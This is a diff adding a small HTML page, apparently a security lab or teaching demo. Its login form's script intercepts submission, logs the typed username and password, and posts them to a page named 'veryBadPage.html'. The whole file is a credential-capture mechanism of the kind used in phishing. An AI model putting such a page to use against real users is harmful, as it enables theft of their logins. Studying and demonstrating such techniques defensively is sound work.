@@ -1,0 +1,40 @@
+<!doctype html>
+<html class="no-js" lang="">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title></title>
+    <meta name="description">
+    <link rel="stylesheet" href="../css/styles.css">
+  </head>
+  <body>
+    <form id="hackform" action="" method="post" accept-charset="utf-8">
+      <input id="username" type="text" name="username">
+      <br>
+      <input id="password" type="password" name="password">
+      <br>
+      <input id="submit" class="btn" type="submit" name="send" value="log in">
+    </form>
+    <script type="text/javascript">
+      document.getElementById('hackform').addEventListener('submit', function(e) {
+
+        e.preventDefault();
+        e.stopPropagation();
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        console.log("Username: " + username);
+        console.log("Password: " + password);
+
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+          console.log("Yes you did it!");
+          }
+        };
+        xhttp.open("POST", "veryBadPage.html", true);
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhttp.send("username=" + username + "&password=" + password);
+      });
+    </script>
+  </body>
+</html>
